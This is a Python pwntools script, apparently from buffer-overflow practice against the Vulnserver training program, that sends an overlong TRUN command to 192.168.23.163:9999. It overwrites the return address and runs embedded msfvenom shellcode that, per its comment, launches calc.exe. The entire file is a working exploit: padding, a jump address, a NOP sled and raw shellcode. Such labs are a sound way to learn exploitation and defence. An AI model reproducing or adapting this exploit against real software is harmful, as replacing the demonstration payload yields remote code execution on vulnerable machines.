from pwn import *

#msfvenom -p windows/exec CMD="calc.exe" -f python -v shellcode -b "\x00"
shellcode =  b""
shellcode += b"\xd9\xce\xba\xd8\x9d\x88\x7a\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x31\x31\x56\x18\x83\xc6\x04"
shellcode += b"\x03\x56\xcc\x7f\x7d\x86\x04\xfd\x7e\x77\xd4"
shellcode += b"\x62\xf6\x92\xe5\xa2\x6c\xd6\x55\x13\xe6\xba"
shellcode += b"\x59\xd8\xaa\x2e\xea\xac\x62\x40\x5b\x1a\x55"
shellcode += b"\x6f\x5c\x37\xa5\xee\xde\x4a\xfa\xd0\xdf\x84"
shellcode += b"\x0f\x10\x18\xf8\xe2\x40\xf1\x76\x50\x75\x76"
shellcode += b"\xc2\x69\xfe\xc4\xc2\xe9\xe3\x9c\xe5\xd8\xb5"
shellcode += b"\x97\xbf\xfa\x34\x74\xb4\xb2\x2e\x99\xf1\x0d"
shellcode += b"\xc4\x69\x8d\x8f\x0c\xa0\x6e\x23\x71\x0d\x9d"
shellcode += b"\x3d\xb5\xa9\x7e\x48\xcf\xca\x03\x4b\x14\xb1"
shellcode += b"\xdf\xde\x8f\x11\xab\x79\x74\xa0\x78\x1f\xff"
shellcode += b"\xae\x35\x6b\xa7\xb2\xc8\xb8\xd3\xce\x41\x3f"
shellcode += b"\x34\x47\x11\x64\x90\x0c\xc1\x05\x81\xe8\xa4"
shellcode += b"\x3a\xd1\x53\x18\x9f\x99\x79\x4d\x92\xc3\x17"
shellcode += b"\x90\x20\x7e\x55\x92\x3a\x81\xc9\xfb\x0b\x0a"
shellcode += b"\x86\x7c\x94\xd9\xe3\x73\xde\x40\x45\x1c\x87"
shellcode += b"\x10\xd4\x41\x38\xcf\x1a\x7c\xbb\xfa\xe2\x7b"
shellcode += b"\xa3\x8e\xe7\xc0\x63\x62\x95\x59\x06\x84\x0a"
shellcode += b"\x59\x03\xe7\xcd\xc9\xcf\xc6\x68\x6a\x75\x17"

ip = "192.168.23.163"
port = 9999

sh = connect(ip, port)

print sh.recvrepeat(1)

buf= "TRUN ."

buf += "A"*2006
buf += "\xaf\x11\x50\x62"

buf += "\x90"*20

buf += shellcode

buf += "C"*(5000-len(buf))

sh.sendline(buf)

print sh.recvrepeat(1)
